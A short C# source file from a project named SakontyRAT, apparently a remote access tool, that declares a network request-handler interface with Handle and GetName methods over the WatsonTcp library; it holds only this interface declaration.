using System;
using WatsonTcp;

namespace SakontyRAT.Network
{
    public interface IRequestHandler
    {
        void Handle(WatsonTcpClient client, SakontyMessage message);

        string GetName();
    }
}